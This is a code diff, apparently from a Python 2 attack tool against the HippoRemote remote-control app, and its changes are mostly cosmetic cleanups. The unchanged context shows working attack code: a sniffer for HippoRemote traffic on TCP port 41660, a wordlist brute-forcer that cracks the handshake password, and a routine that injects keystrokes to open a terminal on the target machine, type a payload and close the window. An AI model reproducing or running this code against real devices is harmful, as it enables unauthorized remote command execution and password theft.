@@ -56,8 +56,9 @@ def inject_keystrokes(address, port, password, listen_host, listen_port, speed):
     s.send(MESSAGE)
     s.send("\x0d\x0a")
     time.sleep(1)
-    # Open the terminal
+
     open_terminal(s, speed)
+
     #Inject the payload
     i = 0
     while i < len(payload):
@@ -68,9 +69,9 @@ def inject_keystrokes(address, port, password, listen_host, listen_port, speed):
         s.send("\x0d\x0a")
         time.sleep(speed)
         i += 1
-    #Make sure the terminal window is closed
+
     close_terminal(s, speed)
-    #Close socket
+
     s.close()
 
 def print_banner():
@@ -93,12 +94,6 @@ def print_banner():
 
 def close_terminal(s, speed):
 
-    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
-    s.send("\x0d\x0a")
-    time.sleep(speed)
-    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
-    s.send("\x0d\x0a")
-    time.sleep(speed)
     s.send('{"id": "keyCodePress", "key": "CMD", "down": true}')
     s.send("\x0d\x0a")
     time.sleep(speed)
@@ -197,13 +192,13 @@ def sniffer(packet):
 
 
 def brute_force(challenge,response, wordlist):
+
     start_time = time.time()
     f = open(wordlist, 'r')
     passlist = f.read().split('\n')
     for password in passlist:
         if len(password) <= 8:
             result = handshake(password, challenge)
-            #print "Trying '" + password + "'"
             if str.upper(result) == response:
                 print "Success! '" + password + "' is the correct password"
                 sys.exit()
@@ -211,6 +206,7 @@ def brute_force(challenge,response, wordlist):
 
 
 def TrueXor(*args):
+    #Makes sure only one option is selected
     return sum(args) == 1
 
 
@@ -230,8 +226,9 @@ def main():
     args = parser.parse_args()
     print_banner()
     if TrueXor(args.sniff, args.inject, args.crack) == False:
-        print "Please select one opion out of --sniff, --inject, or --crack"
+        print "Please select one option out of --sniff, --inject, or --crack"
         sys.exit()
+
     if args.sniff:
         print "Now sniffing for HippoRemote activity..."
         sniff(filter="tcp port 41660", prn=sniffer, store=0)
